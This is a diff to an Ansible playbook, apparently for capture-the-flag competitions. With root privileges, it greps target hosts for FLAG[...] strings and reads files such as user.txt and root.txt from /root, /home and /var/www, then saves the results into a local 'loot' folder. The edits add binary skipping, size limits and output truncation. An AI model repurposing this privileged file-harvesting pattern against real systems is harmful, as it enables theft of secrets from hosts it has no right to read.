@@ -10,10 +10,13 @@
 - name: Targeted Flag Extraction
   become: yes
   shell: |
-    # 1. Search for the FLAG[...] string pattern
-    grep -rEo "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null || true
-    # 2. Search for common competition flag files and cat their content
-    find /root /home /var/www -name "*flag*" -o -name "user.txt" -o -name "root.txt" 2>/dev/null | xargs -I {} sh -c 'echo "{}: $(cat {})"' || true
+    # 1. Search for FLAG[...] pattern - Skip binaries (-I) and limit line length
+    grep -rEIo "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null | cut -c 1-200 || true
+
+    # 2. Find common flag files - Exclude images and limit to small text files
+    find /root /home /var/www -maxdepth 4 -size -100k -type f \( -name "*flag*" -o -name "user.txt" -o -name "root.txt" \) \
+    ! -path "*.png" ! -path "*.jpg" ! -path "*.gif" ! -path "*.ico" ! -path "*.svg" 2>/dev/null | \
+    xargs -I {} sh -c 'echo "{}: $(tr -cd "[:print:]" < {} | head -c 100)"' || true
   register: fs_matches
   failed_when: false
   changed_when: false
@@ -23,7 +26,9 @@
   copy:
     content: |
       === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
-      [FILE PATH : FLAG STRING]
+      [TIMESTAMP: {{ ansible_date_time.iso8601 if ansible_date_time is defined else "N/A" }}]
+      
+      [DETECTION RESULTS]
       {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
   become: no
@@ -32,5 +37,4 @@
   debug:
     msg: 
       - "--- FLAGS DETECTED ON {{ inventory_hostname }} ---"
-      - "{{ fs_matches.stdout_lines if fs_matches.stdout != '' else ['NO FLAGS FOUND IN SCANNED DIRECTORIES'] }}"
-  # Removed the 'when' condition so you ALWAYS get a status update on your screen
+      - "{{ fs_matches.stdout_lines if fs_matches.stdout != '' else ['CLEAN: No flags found in text-based scans'] }}"
